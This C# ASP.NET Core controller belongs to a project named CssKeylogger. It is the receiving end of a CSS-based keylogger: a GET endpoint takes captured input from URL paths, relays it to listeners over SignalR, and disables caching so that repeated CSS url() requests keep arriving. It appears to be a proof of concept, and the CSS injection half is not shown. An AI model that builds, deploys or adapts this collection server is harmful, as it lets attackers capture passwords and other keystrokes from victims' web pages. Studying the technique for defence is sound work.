using CssKeylogger.Web.Hubs;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.SignalR;

namespace CssKeylogger.Web.Controllers
{
    [Route("api/[controller]")]
    public class KeyloggerController : Controller
    {
        private readonly IHubContext<KeyloggerListenerHub> _keyloggerListenerHub;

        public KeyloggerController(IHubContext<KeyloggerListenerHub> keyloggerListenerHub)
        {
            _keyloggerListenerHub = keyloggerListenerHub;
        }

        [HttpGet("{type}/{input}")]
        public async void LogInput(string type, string input)
        {
            await _keyloggerListenerHub.Clients.All.InvokeAsync("InputReceived", type, input);

            // Css has its own cache on the url() that isn't affected by headers here
            Response.Headers["Pragma-directive"] = "no-cache";
            Response.Headers["Cache-directive"] = "no-cache";
            Response.Headers["Cache-control"] = "no-cache";
            Response.Headers["Pragma"] = "no-cache";
            Response.Headers["Expires"] = "0";
        }
    }
}
